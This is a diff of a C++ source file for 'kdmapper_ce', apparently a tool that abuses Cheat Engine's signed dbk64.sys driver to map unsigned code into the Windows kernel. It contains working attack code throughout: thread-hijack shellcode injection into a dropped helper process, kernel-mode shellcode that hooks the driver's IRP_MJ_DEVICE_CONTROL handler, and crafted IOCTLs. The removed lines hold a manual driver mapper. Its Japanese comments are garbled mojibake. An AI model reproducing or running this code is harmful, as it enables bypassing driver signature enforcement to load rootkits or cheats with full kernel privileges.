@@ -1,7 +1,9 @@
-#include "kdmapper_ce.hpp"
+Ôªø#include "kdmapper_ce.hpp"
+UINT64 pMmGetSystemRoutineAddress = NULL;
+UINT64 pIofCompleteRequest = NULL;
 
 HANDLE kdmapper_ce::CreateKernelModuleUnloaderProcess() {
-  
+
     HANDLE result = INVALID_HANDLE_VALUE;
 
     // drop kernelmoduleunloader.exe into the %temp% folder
@@ -32,7 +34,7 @@ HANDLE kdmapper_ce::CreateKernelModuleUnloaderProcess() {
         return result;
     }
 
-    // kernelmoduleunloaderÉvÉçÉZÉXÇçÏê¨
+    // kernelmoduleunloaderÔøΩvÔøΩÔøΩÔøΩZÔøΩXÔøΩÔøΩÔøΩÏê¨
 
     STARTUPINFO si;
     PROCESS_INFORMATION pi;
@@ -66,7 +68,7 @@ HANDLE kdmapper_ce::CreateKernelModuleUnloaderProcess() {
 
 HANDLE kdmapper_ce::GetDbk64DeviceHandleByInjection(HANDLE hTargetProcess) {
 
-    // kernelmoduleunloader.exe process ÇÃÉXÉåÉbÉhÇhijack
+    // kernelmoduleunloader.exe process ÔøΩÃÉXÔøΩÔøΩÔøΩbÔøΩhÔøΩÔøΩhijack
 
     HANDLE hDevice = INVALID_HANDLE_VALUE;
     HANDLE threadHijacked = NULL;
@@ -119,18 +121,18 @@ HANDLE kdmapper_ce::GetDbk64DeviceHandleByInjection(HANDLE hTargetProcess) {
     ZeroMemory(&ct32, sizeof(PWOW64_CONTEXT));
 
     Wow64SuspendThread(targetThread);
-    
+
     ct32.ContextFlags = CONTEXT_CONTROL;
     Wow64GetThreadContext(targetThread, &ct32);
-    
+
     ct32.Eip = (DWORD)remoteShellcodeBuffer;
-    
+
     Wow64SetThreadContext(targetThread, &ct32);
     ResumeThread(targetThread);
 
     Sleep(1000); // 1s
 
-    // patternÇ≈kernelmoduleunloaderÇÃÉvÉçÉZÉXÉÅÉÇÉäÇÉXÉLÉÉÉì
+    // patternÔøΩÔøΩkernelmoduleunloaderÔøΩÃÉvÔøΩÔøΩÔøΩZÔøΩXÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩXÔøΩLÔøΩÔøΩÔøΩÔøΩ
 
     MEMORY_PATTERN  pattern = { 0x12345678, NULL, 0x12345678 };
 
@@ -141,7 +143,7 @@ HANDLE kdmapper_ce::GetDbk64DeviceHandleByInjection(HANDLE hTargetProcess) {
         MEM_COMMIT,
         MEM_PRIVATE
     );
-    
+
 #ifdef _DEBUG
     //Log("%x, %d, %x", tmp_pattern->marks, tmp_pattern->handle, tmp_pattern->marks2);
 #endif // DEBUG
@@ -158,7 +160,7 @@ LPVOID kdmapper_ce::SearchMemoryForPattern(HANDLE hProcess, MEMORY_PATTERN patte
     LPVOID offset = 0;
     LPVOID lpBuffer = NULL;
     MEMORY_BASIC_INFORMATION mbi = {};
-    
+
     lpBuffer = VirtualAlloc(NULL, sizeof(MEMORY_PATTERN), MEM_COMMIT, PAGE_READWRITE);
     if (lpBuffer == NULL) {
         Error("VirtualAlloc failed");
@@ -188,14 +190,14 @@ LPVOID kdmapper_ce::SearchMemoryForPattern(HANDLE hProcess, MEMORY_PATTERN patte
 
         ReadProcessMemory(hProcess, mbi.BaseAddress, lpBuffer, sizeof(MEMORY_PATTERN), NULL);
         SIZE_T res = RtlCompareMemory(lpBuffer, (const void*)&pattern, sizeof(MEMORY_PATTERN));
-        
+
         if (mbi.AllocationProtect == flProtect && mbi.State == flAllocationType && mbi.Type == flType && res != (SIZE_T)0)
         {
             Log("Pattern found at 0x%x (match pattern count: 0x%d)", mbi.BaseAddress, res);
             break;
         }
-        
-        if(mbi.BaseAddress > (PVOID)0x7fffffff)
+
+        if (mbi.BaseAddress > (PVOID)0x7fffffff)
         {
             Error("Scan error: No pattern found");
             break;
@@ -210,8 +212,8 @@ LPVOID kdmapper_ce::SearchMemoryForPattern(HANDLE hProcess, MEMORY_PATTERN patte
 
 HANDLE kdmapper_ce::GetDbk64DeviceHandle()
 {
-	HANDLE hDbk64                              = INVALID_HANDLE_VALUE;
-    HANDLE hKernelModuleUnloader     = INVALID_HANDLE_VALUE;
+    HANDLE hDbk64 = INVALID_HANDLE_VALUE;
+    HANDLE hKernelModuleUnloader = INVALID_HANDLE_VALUE;
 
     hKernelModuleUnloader = CreateKernelModuleUnloaderProcess();
     if (hKernelModuleUnloader == INVALID_HANDLE_VALUE) {
@@ -222,7 +224,7 @@ HANDLE kdmapper_ce::GetDbk64DeviceHandle()
     // drop kernelmoduleunloader.exe.sig into the %temp% folder
 
     utils::CreateFileToTempFromResource(L"Kernelmoduleunloader.exe.sig", kernelmoduleunloader__sig_resource::kernelmoduleunloader_sig, sizeof(kernelmoduleunloader__sig_resource::kernelmoduleunloader_sig));
-        
+
     // Inject the shellcode into the KernelModuleUnloader.exe process to get the device handle of dbk64.sys.
 
     HANDLE hOriginalDbk64 = GetDbk64DeviceHandleByInjection(hKernelModuleUnloader);
@@ -248,7 +250,7 @@ HANDLE kdmapper_ce::GetDbk64DeviceHandle()
 
     TerminateProcess(hKernelModuleUnloader, 0);
     CloseHandle(hKernelModuleUnloader);
-	
+
     return hDbk64;
 }
 
@@ -256,106 +258,23 @@ HANDLE kdmapper_ce::GetDbk64DeviceHandle()
 BOOL kdmapper_ce::MapDriver(HANDLE dbk64_device_handle, HANDLE hDriver, NTSTATUS* exitCode)
 {
     BOOL status = FALSE;
-    
+
     do {
 
         // DeviceIoControlTest
 #ifdef _DEBUG
-        if (!Dbk64DeviceIoControlTest(dbk64_device_handle)) {
+        if (!Dbk64HookedDeviceIoControlTest(dbk64_device_handle, L"MmGetSystemRoutineAddress")) {
             Error("DeviceIoControlTest failed");
             return FALSE;
         }
 #endif // _DEBUG
 
-        // .sys ÉtÉ@ÉCÉãÇÉpÅ[ÉX
-
-    const PIMAGE_NT_HEADERS64 ntHeaders = portable_executable::GetNtHeaders(hDriver);
-    
-    if (!ntHeaders) {
-        Error("Invalid format of PE image");
-        break;
-    }
-    
-    if (ntHeaders->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
-        Error("Image is not 64 bit");
-        break;
-    }
-
-    Log("Validity of the inputted driver: Valid");
-
-    uint32_t ImageSize = ntHeaders->OptionalHeader.SizeOfImage;
-
-    UINT64 KernelBuf = AllocateNonPagedMem(dbk64_device_handle, ImageSize);
-    if (KernelBuf == NULL) {
-        Error("AllocateNoPagedMem failed");
-        break;
-    }
-
-    Log("Kernel memory has been allocatted at 0x%p", KernelBuf);
-    
-    // è„Ç≈ämï€ÇµÇΩÉoÉbÉtÉ@ÇÃMDL ÇçÏê¨ÇµÅCÉÜÅ[ÉUÅ[ãÛä‘Ç©ÇÁÉAÉNÉZÉXâ¬î\Ç…Ç∑ÇÈ
-
-    VOID* SharedBuf = NULL;
-    UINT64 Mdl = NULL;
-
-    if (!CreateSharedMemory(dbk64_device_handle, KernelBuf, (UINT64*)&SharedBuf, &Mdl, ImageSize)) {
-        Error("CreateSharedMemory failed");
-        break;
-    }
-
-    Log("Shared memory has been created in user space at 0x%p (MDL: 0x%p)", SharedBuf, Mdl);
-
-    // Copy image headers
-
-    memcpy(SharedBuf, (BYTE*)hDriver, ntHeaders->OptionalHeader.SizeOfHeaders);
-
-    // Copy image sections
-
-    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
-    for (auto i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++)
-    {
-        if ((section->Characteristics & IMAGE_SCN_CNT_UNINITIALIZED_DATA) > 0)
-            continue;
-        auto sectionDestination = (LPVOID)((DWORD_PTR)SharedBuf + (DWORD_PTR)section->VirtualAddress);
-        auto sectionBytes = (LPVOID)((DWORD_PTR)hDriver + (DWORD_PTR)section->PointerToRawData);
-        memcpy(sectionDestination, sectionBytes, section->SizeOfRawData);
-        Log("Copy section : SectionCount 0x%d 0x%p ", i, sectionDestination);
-        section++;
-    }
-
-    // Resolve relocs and imports
-    
-    DWORD_PTR deltaImageBase = (DWORD_PTR)KernelBuf - (DWORD_PTR)ntHeaders->OptionalHeader.ImageBase;
-    portable_executable::RelocateImageByDelta(portable_executable::GetRelocs((VOID*)SharedBuf), deltaImageBase);
-
-    if (!ResolveImports(dbk64_device_handle, portable_executable::GetImports(SharedBuf))) {
-        Error("Failed to resolve imports");
-        break;
-    }
-
-    // unmap shared memory
-
-    if (!UnMapSharedMemory(dbk64_device_handle, (UINT64)SharedBuf, Mdl)) {
-        Error("UnMapSharedMemory failed");
-        break;
-    }
-
-    // Call driver entry point
-
-    const uint64_t address_of_entry_point = (uint64_t)KernelBuf + ntHeaders->OptionalHeader.AddressOfEntryPoint;
-
-    Log("Calling DriverEntry 0x%p", address_of_entry_point);
-    if (!kdmapper_ce::CallDriverEntry(dbk64_device_handle, address_of_entry_point)) {
-        Error("Failed to call driver entry");
-        break;
-    }
-        
-    status = TRUE;
-
     } while (FALSE);
 
     return status;
+
 }
+
 
 bool kdmapper_ce::CallDriverEntry(HANDLE hDevice, UINT64 EntryPoint) {
 
@@ -375,7 +294,31 @@ bool kdmapper_ce::CallDriverEntry(HANDLE hDevice, UINT64 EntryPoint) {
 
 }
 
-UINT64 kdmapper_ce::AllocateNonPagedMem(HANDLE hDevice,  SIZE_T Size) {
+bool kdmapper_ce::CreateDriverObject(HANDLE hDevice, UINT64 EntryPoint, PCWSTR driverName) {
+
+    auto ioCtlCode = IOCTL_CREATE_DRIVER;
+    DWORD returned;
+    UINT64 pMmGetSystemRoutineAddress = (UINT64)GetSystemProcAddressAddress(hDevice);
+
+    struct input
+    {
+        UINT64 MmGetSystemRoutineAddress;
+        UINT64 DriverInitialize;
+        UINT64 driverName;
+    } inp = {
+        pMmGetSystemRoutineAddress,
+        EntryPoint,
+        (UINT64)driverName
+    };
+
+    if (DeviceIoControl(hDevice, ioCtlCode, &inp, sizeof input, nullptr, 0, &returned, nullptr))
+        return TRUE;
+    else
+        return FALSE;
+
+}
+
+UINT64 kdmapper_ce::AllocateNonPagedMem(HANDLE hDevice, SIZE_T Size) {
 
     auto ioCtlCode = IOCTL_CE_ALLOCATEMEM_NONPAGED;
     DWORD bytesReturned = 0;
@@ -411,7 +354,7 @@ BOOL kdmapper_ce::CreateSharedMemory(HANDLE hDevice, UINT64 kernelBuf, UINT64* s
         UINT64 ToPID;
         UINT64 address;
         DWORD size;
-    } inp = { 
+    } inp = {
         GetCurrentProcessId(),
         GetCurrentProcessId(),
         kernelBuf,
@@ -440,7 +383,8 @@ BOOL kdmapper_ce::CreateSharedMemory(HANDLE hDevice, UINT64 kernelBuf, UINT64* s
     return bRc;
 }
 
-BOOL kdmapper_ce::UnMapSharedMemory(HANDLE hDevice, UINT64 sharedMemAddress, UINT64 Mdl){
+
+BOOL kdmapper_ce::UnMapSharedMemory(HANDLE hDevice, UINT64 sharedMemAddress, UINT64 Mdl) {
 
     auto ioCtlCode = IOCTL_CE_UNMAP_MEMORY;
     DWORD bytesReturned = 0;
@@ -450,8 +394,8 @@ BOOL kdmapper_ce::UnMapSharedMemory(HANDLE hDevice, UINT64 sharedMemAddress, UIN
     {
         UINT64 FromMDL;
         UINT64 Address;
-    } outp = {Mdl, sharedMemAddress };
-    
+    } outp = { Mdl, sharedMemAddress };
+
     bRc = DeviceIoControl(hDevice,
         (DWORD)ioCtlCode,
         &outp,
@@ -475,8 +419,8 @@ BOOL kdmapper_ce::ExecuteKernelModeShellCode(HANDLE hDevice, UINT64 shellcodeAdd
     {
         UINT64	functionaddress; //function address to call
         UINT64	parameters;
-    } inp = 
-    { 
+    } inp =
+    {
         shellcodeAddress,
         shellcodeParam
     };
@@ -496,7 +440,7 @@ BOOL kdmapper_ce::ExecuteKernelModeShellCode(HANDLE hDevice, UINT64 shellcodeAdd
 
 
 BOOL kdmapper_ce::Dbk64DeviceIoControlTest(HANDLE hDevice) {
-    
+
     auto ioCtlCode = IOCTL_CE_TEST;
     DWORD bytesReturned = 0;
     BOOL bRc = FALSE;
@@ -514,15 +458,20 @@ BOOL kdmapper_ce::Dbk64DeviceIoControlTest(HANDLE hDevice) {
     return bRc;
 }
 
-PVOID kdmapper_ce::GetSystemProcAddress(HANDLE hDevice, PCWSTR routineName) {
-    auto ioCtlCode = IOCTL_CE_GETPROCADDRESS;
+PVOID kdmapper_ce::Dbk64HookedDeviceIoControlTest(HANDLE hDevice, PCWSTR functionName) {
+
+    auto ioCtlCode = IOCTL_GETPROCADDRESS;
     DWORD bytesReturned = 0;
     BOOL bRc = FALSE;
-    
+    UINT64 pMmGetSystemRoutineAddress = (UINT64)GetSystemProcAddressAddress(hDevice);
+   
     struct input
     {
-        UINT64 s;
-    } inp = { (UINT64)routineName };
+        UINT64 MmGetSystemRoutineAddress;
+        UINT64 IofCompleteRequest;
+        UINT64 functionName;
+    } inp = { pMmGetSystemRoutineAddress, pIofCompleteRequest, (UINT64)functionName };
+
 
     bRc = DeviceIoControl(hDevice,
         (DWORD)ioCtlCode,
@@ -534,7 +483,64 @@ PVOID kdmapper_ce::GetSystemProcAddress(HANDLE hDevice, PCWSTR routineName) {
         NULL
     );
 
-    return (PVOID)inp.s;
+    if (bRc)
+        return (PVOID)inp.MmGetSystemRoutineAddress;
+    else
+        return NULL;
+}
+
+PVOID kdmapper_ce::GetSystemProcAddressAddress(HANDLE hDevice) {
+    /*
+    auto ioCtlCode = IOCTL_GETPROCADDRESS_ADDRESS;
+    DWORD bytesReturned = 0;
+    BOOL bRc = FALSE;
+
+    struct input
+    {
+        UINT64 MmGetSystemRoutineAddress;
+    } inp = { NULL };
+
+    bRc = DeviceIoControl(hDevice,
+        (DWORD)ioCtlCode,
+        &inp,
+        sizeof(input),
+        &inp,
+        sizeof(inp),
+        &bytesReturned,
+        NULL
+    );
+
+    return (PVOID)inp.MmGetSystemRoutineAddress;
+    */
+    return (PVOID)pMmGetSystemRoutineAddress;
+}
+
+PVOID kdmapper_ce::GetSystemProcAddress(HANDLE hDevice, PCWSTR functionName) {
+    auto ioCtlCode = IOCTL_GETPROCADDRESS;
+    DWORD bytesReturned = 0;
+    BOOL bRc = FALSE;
+    UINT64 pMmGetSystemRoutineAddress = (UINT64)GetSystemProcAddressAddress(hDevice);
+
+    struct input
+    {
+        UINT64 MmGetSystemRoutineAddress;
+        UINT64 functionName;
+    } inp = { pMmGetSystemRoutineAddress, (UINT64)functionName };
+
+    bRc = DeviceIoControl(hDevice,
+        (DWORD)ioCtlCode,
+        &inp,
+        sizeof(input),
+        &inp,
+        sizeof(inp),
+        &bytesReturned,
+        NULL
+    );
+
+    if (bRc)
+        return (PVOID)inp.MmGetSystemRoutineAddress;
+    else
+        return FALSE;
 }
 
 BOOL kdmapper_ce::PatchMajorFunction(HANDLE dbk64_device_handle)
@@ -543,21 +549,17 @@ BOOL kdmapper_ce::PatchMajorFunction(HANDLE dbk64_device_handle)
     BOOL bRc = FALSE;
     SIZE_T shellcodeSize = sizeof(kernel_mode_shellcode_resource::kernel_mode_shellcode);
     VOID* shellcode = (VOID*)kernel_mode_shellcode_resource::kernel_mode_shellcode;
+    SIZE_T shellcodeIoctlSize = sizeof(kernel_mode_shellcode_ioctl_resource::kernel_mode_shellcode_ioctl);
+    VOID* shellcodeIoctl = (VOID*)kernel_mode_shellcode_ioctl_resource::kernel_mode_shellcode_ioctl;
 
     do {
 
-        // DeviceIoControlTest
-#ifdef _DEBUG
-        if (!Dbk64DeviceIoControlTest(dbk64_device_handle)) {
-            Error("DeviceIoControlTest failed");
-            return FALSE;
-        }
-#endif // _DEBUG
+        pMmGetSystemRoutineAddress = (UINT64)CEGetSystemProcAddress(dbk64_device_handle, L"MmGetSystemRoutineAddress");
+        pIofCompleteRequest = (UINT64)CEGetSystemProcAddress(dbk64_device_handle, L"IofCompleteRequest");
 
+        // IRP_MJ_DEVICE_CONTROL„ÅÆHook
 
-        // IRP_MJ_DEVICE_CONTROL ÇÃ Hook
-
-        // IOCTL_CE_ALLOCATEMEM_NONPAGEDÇ≈îÒÉyÅ[ÉWÉvÅ[ÉãÇ…ÉÅÉÇÉäÇämï€
+        // IOCTL_ALLOCATEMEM_NONPAGED„ÅßÈùû„Éö„Éº„Ç∏„Éó„Éº„É´„Å´„É°„É¢„É™„ÇíÁ¢∫‰øù
 
         UINT64 kernelShellcodeBuf = AllocateNonPagedMem(dbk64_device_handle, shellcodeSize);
         if (kernelShellcodeBuf == NULL) {
@@ -567,7 +569,7 @@ BOOL kdmapper_ce::PatchMajorFunction(HANDLE dbk64_device_handle)
 
         Log("Kernel memory has been allocatted at 0x%p", kernelShellcodeBuf);
 
-        // è„Ç≈ämï€ÇµÇΩÉoÉbÉtÉ@ÇÃMDL ÇçÏê¨ÇµÅCÉÜÅ[ÉUÅ[ãÛä‘Ç©ÇÁÉAÉNÉZÉXâ¬î\Ç…Ç∑ÇÈ
+        // ‰∏ä„ÅßÁ¢∫‰øù„Åó„Åü„Éê„ÉÉ„Éï„Ç°„ÅÆMDL „Çí‰ΩúÊàê„ÅóÔºå„É¶„Éº„Ç∂„ÉºÁ©∫Èñì„Åã„Çâ„Ç¢„ÇØ„Çª„ÇπÂèØËÉΩ„Å´„Åô„Çã
 
         UINT64 shellcodeBuf = NULL;
         UINT64 Mdl = NULL;
@@ -580,33 +582,46 @@ BOOL kdmapper_ce::PatchMajorFunction(HANDLE dbk64_device_handle)
         Log("Shared memory for shellcode has been created in user space at 0x%p (MDL: 0x%p)", shellcodeBuf, Mdl);
 
 
-        // ã§óLÉÅÉÇÉäÇ…ÉJÅ[ÉlÉãÉÇÅ[ÉhÉVÉFÉãÉRÅ[ÉhÇèëÇ´çûÇ›
+        // ÂÖ±Êúâ„É°„É¢„É™„Å´„Ç´„Éº„Éç„É´„É¢„Éº„Éâ„Ç∑„Çß„É´„Ç≥„Éº„Éâ„ÇíÊõ∏„ÅçËæº„Åø
 
         memcpy((void*)shellcodeBuf, shellcode, shellcodeSize);
 
-        // ÉÜÅ[ÉUÅ[ãÛä‘Ç…äÑÇËìñÇƒÇΩÉÅÉÇÉäÇÃÉAÉìÉ}ÉbÉv
+        // „É¶„Éº„Ç∂„ÉºÁ©∫Èñì„Å´Ââ≤„ÇäÂΩì„Å¶„Åü„É°„É¢„É™„ÅÆ„Ç¢„É≥„Éû„ÉÉ„Éó
 
         if (!UnMapSharedMemory(dbk64_device_handle, shellcodeBuf, Mdl)) {
             Error("UnMapSharedMemory failed");
             break;
         }
 
-        // ÉVÉFÉãÉRÅ[ÉhÇÃà¯êîÇèÄîı
+        // „Ç∑„Çß„É´„Ç≥„Éº„Éâ„ÅÆÂºïÊï∞„ÇíÊ∫ñÂÇô
         // Change per PIS
-        USHORT returnedDataMaxSize = sizeof(ULONG);
 
-        LPVOID pMmGetSystemRoutineAddress = GetSystemProcAddress(dbk64_device_handle, L"MmGetSystemRoutineAddress");
-        LPVOID ReturnedDataAddress = (LPVOID)AllocateNonPagedMem(dbk64_device_handle, returnedDataMaxSize);
+        UINT64 ioctlShellcodeBuf = AllocateNonPagedMem(dbk64_device_handle, shellcodeIoctlSize);
+        UINT64 ioctlSharedBuf = NULL;
+        UINT64 Mdl1_2 = NULL;
+        if (!CreateSharedMemory(dbk64_device_handle, ioctlShellcodeBuf, &ioctlSharedBuf, &Mdl1_2, shellcodeIoctlSize)) {
+            Error("CreateSharedMemory failed");
+            break;
+        }
+
+        Log("Shared memory for shellcode param has been created in user space at 0x%p (MDL: 0x%p)", ioctlSharedBuf, Mdl1_2);
+
+        memcpy((void*)ioctlSharedBuf, shellcodeIoctl, shellcodeIoctlSize);
+
+        if (!UnMapSharedMemory(dbk64_device_handle, ioctlSharedBuf, Mdl1_2)) {
+            Error("UnMapSharedMemory failed");
+            break;
+        }
 
         struct KernelPisParameters
         {
             LPVOID MmGetSystemRoutineAddress;
-            LPVOID ReturnedDataAddress;
-            USHORT ReturnedDataMaxSize;
+            LPVOID HookFunctionAddress;
+            USHORT dummy2;
         } pisParameters = {
-            pMmGetSystemRoutineAddress,
-            ReturnedDataAddress,
-            returnedDataMaxSize
+            GetSystemProcAddressAddress(dbk64_device_handle),
+            (LPVOID)ioctlShellcodeBuf,
+            NULL
         };
 
         UINT64 kernelParamAddr = AllocateNonPagedMem(dbk64_device_handle, sizeof(KernelPisParameters));
@@ -627,7 +642,7 @@ BOOL kdmapper_ce::PatchMajorFunction(HANDLE dbk64_device_handle)
             break;
         }
 
-        // ÉJÅ[ÉlÉãÉÇÅ[ÉhÉVÉFÉãÉRÅ[ÉhÇÃé¿çs
+        // „Ç´„Éº„Éç„É´„É¢„Éº„Éâ„Ç∑„Çß„É´„Ç≥„Éº„Éâ„ÅÆÂÆüË°å„Åó„Éë„ÉÉ„ÉÅ„ÇíÂΩì„Å¶„Çã
 
         UINT64 shellcodeAddress = kernelShellcodeBuf;
         UINT64 shellcodeParam = kernelParamAddr;
@@ -636,6 +651,14 @@ BOOL kdmapper_ce::PatchMajorFunction(HANDLE dbk64_device_handle)
             break;
         }
 
+        // Hooked DeviceIoControlTest
+#ifdef _DEBUG
+        //if (!Dbk64DeviceIoControlTest(dbk64_device_handle)) {
+        //    Error("DeviceIoControlTest failed");
+        //    return FALSE;
+        //}
+#endif // _DEBUG
+
         bRc = TRUE;
 
     } while (false);
@@ -643,9 +666,32 @@ BOOL kdmapper_ce::PatchMajorFunction(HANDLE dbk64_device_handle)
     return bRc;
 }
 
+PVOID kdmapper_ce::CEGetSystemProcAddress(HANDLE hDevice, PCWSTR routineName) {
+    auto ioCtlCode = IOCTL_CE_GETPROCADDRESS;
+    DWORD bytesReturned = 0;
+    BOOL bRc = FALSE;
+
+    struct input
+    {
+        UINT64 s;
+    } inp = { (UINT64)routineName };
+
+    bRc = DeviceIoControl(hDevice,
+        (DWORD)ioCtlCode,
+        &inp,
+        sizeof(input),
+        &inp,
+        sizeof(inp),
+        &bytesReturned,
+        NULL
+    );
+
+    return (PVOID)inp.s;
+}
+
 bool kdmapper_ce::ResolveImports(HANDLE hDevice, portable_executable::vec_imports imports) {
     for (const auto& current_import : imports) {
-    
+
         /*ULONG64 Module = utils::GetKernelModuleAddress(current_import.module_name);
         if (!Module) {
 #if !defined(DISABLE_OUTPUT)
@@ -656,26 +702,26 @@ bool kdmapper_ce::ResolveImports(HANDLE hDevice, portable_executable::vec_import
         for (auto& current_function_data : current_import.function_datas) {
             //uint64_t function_address = GetKernelModuleExport(hDevice, Module, current_function_data.name);
             //TODO:
-            // åªèÛntoskrnlÇÃÇ›ëŒâû
+            // ÔøΩÔøΩÔøΩÔøΩntoskrnlÔøΩÃÇ›ëŒâÔøΩ
             std::wstring function_name(current_function_data.name.begin(), current_function_data.name.end());
             uint64_t function_address = (uint64_t)GetSystemProcAddress(hDevice, function_name.c_str());
 
             //uint64_t function_address = MmGetSystemRoutineAddress(hDevice, current_function_data.name);
             Log("ResolveImports: import %ls (0x%p)", function_name.c_str(), function_address);
-//            if (!function_address) {
-//                //Lets try with ntoskrnl
-//                if (Module != ntoskrnlAddr) {
-//                    function_address = GetKernelModuleExport(hDevice, ntoskrnlAddr, current_function_data.name);
-//                    if (!function_address) {
-//#if !defined(DISABLE_OUTPUT)
-//                        Log("Failed to resolve import %s (%s)", current_function_data.name, current_import.module_name);
-//#endif
-                        //return false;
-                   // }
-                //}
-            //}
+            //            if (!function_address) {
+            //                //Lets try with ntoskrnl
+            //                if (Module != ntoskrnlAddr) {
+            //                    function_address = GetKernelModuleExport(hDevice, ntoskrnlAddr, current_function_data.name);
+            //                    if (!function_address) {
+            //#if !defined(DISABLE_OUTPUT)
+            //                        Log("Failed to resolve import %s (%s)", current_function_data.name, current_import.module_name);
+            //#endif
+                                    //return false;
+                               // }
+                            //}
+                        //}
 
-            *current_function_data.address = function_address;
+            * current_function_data.address = function_address;
         }
     }
 
